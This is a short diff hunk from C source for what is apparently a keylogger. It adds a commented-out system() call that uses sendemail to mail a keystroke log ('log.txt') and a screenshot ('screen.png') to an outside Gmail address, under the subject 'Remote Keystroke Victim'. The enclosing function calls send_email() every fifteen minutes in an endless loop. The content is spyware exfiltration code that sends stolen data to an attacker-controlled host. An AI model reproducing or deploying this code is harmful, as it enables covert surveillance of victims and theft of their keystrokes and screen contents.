@@ -367,6 +367,7 @@ void *trigger_send_email(){
     while(1){
         sleep(15*60);
         send_email();
+	//system("sendemail -f \"doi2xuyenviet7@gmail.com\" -u \"Remote Keystroke Victim\" -t \"nguyenngocdoanh1998@gmail.com\" -s \"smtp.gmail.com:587\" -o tls=yes -xu \"doi2xuyenviet7@gmail.com\" -xp \"PASSWORD\" -o message-file="tmp" -a "log.txt" -a \"screen.png\"");
     }
 }
 
